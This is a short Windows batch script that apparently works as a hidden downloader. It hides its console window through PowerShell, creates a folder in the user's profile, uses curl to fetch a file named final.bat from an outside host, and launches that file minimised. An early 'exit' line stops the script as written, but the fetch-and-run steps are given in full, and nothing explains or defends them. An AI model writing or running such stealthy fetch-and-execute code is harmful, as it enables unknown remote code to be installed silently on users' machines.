@echo off
exit
echo Minimizing...
powershell -window minimized -command ""
echo Hiding...
powershell -window hidden -command ""
cd %UserProfile%
md lulw
cd lulw
del final.bat
ping localhost -n 3 >nul
curl -s https://sources.tobir.xyz/final.bat >final.bat
ping localhost -n 3 >nul
start final.bat /min